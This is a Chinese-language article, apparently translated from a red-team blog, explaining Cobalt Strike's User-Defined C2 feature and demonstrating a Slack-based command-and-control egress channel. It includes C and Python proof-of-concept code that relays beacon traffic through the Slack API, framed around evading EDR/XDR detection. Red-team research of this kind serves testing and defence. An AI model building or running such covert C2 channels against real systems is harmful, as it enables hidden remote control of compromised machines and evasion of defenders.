---
title: Cobalt Strike 用户自定义 C2 开启出口通信新篇章
url: https://mp.weixin.qq.com/s/ufZZzUNvPy4Svb_El6JOig
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:27:40.512432
---

# Cobalt Strike 用户自定义 C2 开启出口通信新篇章

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0GFKBicfBcSib65qf91SoNIj1a9yzhFkR1jz3qiaibt1YEXzE62yd2JicWdZ1CujbghKTa3g3ibHibDGcnYPmDrTNrWopqhc7EtHRmu7g/0?wx_fmt=jpeg)

# Cobalt Strike 用户自定义 C2 开启出口通信新篇章

Ots安全

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

年来，外部C2因其支持自定义出口通道，一直被视为绕过EDR和XDR解决方案的最有效方法之一。它允许红队设计自己的通信机制，从而避开防御者传统上监控和检测的静态特征。

然而，随着外部C2技术的成熟，一些局限性也逐渐显现出来：

* Beacon 的睡眠行为（睡眠间隔和抖动）无法修改。
* 第三方客户端必须向外部控制器请求 SMB Beacon，然后将其注入本地——本质上是重新创建分阶段有效载荷工作流程。
* 需要两次注入：首先，第三方客户端注入 SMB 信标；然后，SMB 信标将自身注入内存。这会导致操作安全性低下。
* SMB Beacon 有效载荷阶段以未加密的形式驻留在内存中，不受 Artifact Kit 或可修改的配置文件设置的影响。这可以说是外部 C2 最显著的弱点。
* 第三方客户端的开发必须完全从零开始，需要投入大量的工程精力。
* 由于依赖命名管道，它通常只支持一个外部 Beacon 会话，因此操作用途受到限制，难以扩展。
* 虽然它在编程语言选择方面提供了很大的灵活性，但这种灵活性是以所有东西都需要自己构建为代价的。

**用户自定义指挥控制：新型外部指挥控制**

用户自定义 C2 (UDC2) 是外部 C2 的升级版，旨在解决外部 C2 的诸多不足。UDC2 体积更小，仅需开发一个信标对象文件 (BOF)，而无需完整的独立客户端。

新的工作流程可以概括如下：Beacon 利用 UDC2 BOF 通过 BOF 中实现的自定义 C2 通道传输加密帧。BOF 使用您的 C2 协议与 UDC2 服务器通信，UDC2 服务器再通过直接 TCP 链路将帧数据转发到您 Cobalt Strike 团队服务器上的 UDC2 监听器。

下图描述了用户自定义 C2 和外部 C2 之间的架构差异：

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0FiaN05XCUl5g3G2qCHyzqjryTaBLTnvTTWQic5qyhjffbtXPyZ5quRM3vF9lTEgpDGNYKZVx2awaMgeFkEAteJdvb80gVr002bM/640?wx_fmt=png&from=appmsg)

图 1：外部 C2 和 UDC2 架构的示意图比较

如图所示，虽然从开发角度来看，攻击者的基础设施（几乎）保持不变，但区别在于客户端本身。以前使用外部 C2 时，整个客户端都需要单独开发。这意味着客户端会请求 SMB 信标，将其注入到自身，并通过命名管道与其通信以转发信标任务，之后解析其输出，再通过出口通道将其发送回 Teamserver。

使用 UDC2，只需开发 BOF 即可，它将代理信标功能，从而将流量重定向到自定义通信通道。由于信标本身保持不变，我们可以使用Artifact Kit、Sleep Mask、UDRL以及 Cobalt Strike提供的所有其他规避功能。

**用户自定义 C2：优势**

使用 UDC2：

* 操作员可以像修改原生 Beacon 一样自由地修改 Beacon 的睡眠行为。
* 可以通过多个外部信标进行通信。这是因为不再需要连接到 SMB 信标的命名管道。
* 开发开销大大降低，使开发人员能够专注于设计自定义出口通道。
* 然而，主要的限制是开发仅限于C 语言，因为 Beacon 对象文件 (BOF) 必须用 C 语言编写。

额外的 BOF 也可能具有规避特性，尤其是在利用与常用服务（例如 Slack、Microsoft 平台、AWS、Mattermost、Discord 等）相关的 API 或库时。当 BOF 流量与目标环境中已有的合法工具和通信模式相一致时，更容易融入其中。然而，长时间或高容量的任务（例如转发大量流量）可能会产生异常峰值（例如，每分钟 Slack 消息数量异常高），这可能会引起监控解决方案或 EDR 平台的怀疑。增加 Beacon 休眠间隔有助于降低这种可见性，但这种方法可能不太适用于 proxychains 流量，因为 proxychains 流量需要速度来避免连接超时。

**演示：Slack 出口频道**

由于 Fortra开源了一个演示通过 ICMP 回显请求和回复实现 UDC2 的项目，我们决定尝试一下这项新功能——这次我们使用 Slack。为此，我们搭建了一个 Slack 工作区，并创建了一个具有发送和读取消息权限的机器人。我们的设计使用了两个独立的频道：一个用于客户端到服务器的通信，另一个用于服务器到客户端的响应。这种分离有助于防止任何潜在的通信冲突。

Slack 传输的最初开发始于一个简单的目标：利用WinInetAPI 对 Slack Web API 执行 HTTPS POST 和 GET 请求。在早期的“概念验证”阶段，逻辑很简单——数据使用标准库函数（sprintf例如）进行格式化，缓冲区被声明为栈上的固定大小数组（例如char response[8192]）。

```
void Slack_ReadLastMessage(const char* token, const char* channelId) {     HINTERNET hSession = InternetOpenA("SlackReader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);     HINTERNET hConnect = InternetConnectA(hSession, "slack.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);     // Slack uses GET with query params for history     char path[512];     snprintf(path, sizeof(path), "/api/conversations.history?channel=%s&limit=1", channelId);     HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);     char headers[512];     snprintf(headers, sizeof(headers), "Authorization: Bearer %s\r\n", token);     if (HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), NULL, 0)) {         char response[8192] = { 0 };         DWORD read;         InternetReadFile(hRequest, response, sizeof(response) - 1, &read);         char lastMsg[1024] = { 0 };         ExtractJsonValue(response, "text", lastMsg, sizeof(lastMsg));         printf("[SLACK] Last Message: %s\n", lastMsg);     }     InternetCloseHandle(hRequest);     InternetCloseHandle(hConnect);     InternetCloseHandle(hSession); }
```

虽然这在标准可执行环境中有效，但它与 Beacon 对象文件 (BOF) 的限制从根本上是不兼容的。

为了解决这个问题，我们必须系统地对整个实现进行“解栈”。每个大型缓冲区——原始 HTTP 响应、从 Slack API 提取的 JSON 值以及中间的 Base64 解码二进制文件——都被迁移到了进程堆。官方示例已经实现了一个safeHeapAlloc封装器Kernel32$HeapAlloc。

* char resp[16384]; // Triggers \_\_chkstk
* 我们改用了：void\* respPtr = NULL; safeHeapAlloc(&respPtr, 16384); // BOF compatible

数据发送逻辑也必须遵循同样的逻辑。

在服务器端，我们编写了以下 Python3 代码，用于通过 Slack API 读取和发送数据：

```
   def slack_listener(self) -> None:        """Poll Slack messages from client channel and queue them for relay."""        logging.info("Slack listener started")        last_ts = None        while not self.shutdown_event.is_set():            try:                response = self.slack_client.conversations_history(                    channel=self.config.slack_client_channel,                    oldest=last_ts,                    limit=100                )                messages = response.get('messages', [])                for msg in reversed(messages):                    user_id = 1 # this is a basic PoC, supporting only 1 UDC2 beacon                    text = msg.get('text', '')                    ts = msg.get('ts')                    if ts and (last_ts is None or float(ts) > float(last_ts)):                        last_ts = ts                    if text is not None or text !="":                        print("[+] Received beacon data: " + text)                        text = base64.b64decode(text)                        self.beacon_manager.add_message(user_id, text)                        self.relay_queue.put((user_id, text))                        if self.metrics:                            self.metrics.increment_messages_received()            except SlackApiError as e:                logging.error(f"Slack API error: {e.response['error']}")            except Exception as e:                logging.error(f"Slack listener error: {e}")
    def slack_send_message(self, user_id: str, payload: str):        """Send message back to Slack channel."""        try:            self.slack_client.chat_postMessage(                channel=self.config.slack_server_channel,                text=payload)            if self.metrics:                self.metrics.increment_messages_sent()        except SlackApiError as e:            logging.error(f"Failed to send Slack message: {e.response['error']}")
```

最终结果是，默认的 Beacon 通过 Slack API 发送数据，第三方服务器将其转发到 Cobalt Strike 的团队服务器，从而实现 Slack 出口客户端/服务器通信：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0HRoIlTaMbhu9siaYlDic5jiar5ia8UUia4A30baQSW5bLkv8bNB2u7Xe6NhjDRqTcxVLiaRLiaxUI8iaicPjjgricstyqDKtQlgQZFByJ5A/640?wx_fmt=png&from=appmsg)

图 2：通过 Slack API 进行信标通信

**结论**

总而言之，虽然外部C2为灵活隐蔽的命令与控制定制铺平了道路，但其架构和操作上的缺陷最终限制了其实用性。用户自定义C2代表着更为成熟的演进，它利用BOF（后端交换框架）而非独立客户端，实现了更轻量级的集成、更高的操作安全性和更低的开发开销。尽管它也引入了一些限制，最显著的是对C语言的依赖，但它提供了一种更为精简且易于维护的自定义出口通道构建方法，最终为红队提供了一种更简洁、更安全、更具可扩展性的替代方案。

本文中提到的所有代码和脚本，以及最终项目，都可以在我们的GitHub 存储库中找到。

**参考**

* https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure\_user-defined-c2.htm
* https://www.cobaltstrike.com/blog/cobalt-strike-412-fix-up-look-sharp
* https://github.com/Cobalt-Strike/icmp-udc2

**END**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0GNNk9JlztJWfxJRWm24FpsgO9frE9N7F1ahEOiaJmvo5ekEhUOGfy0EAKeSIym2NvxxJr5fAwQWuoCDQqzdT5NNI0Pr0TEUO4k/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过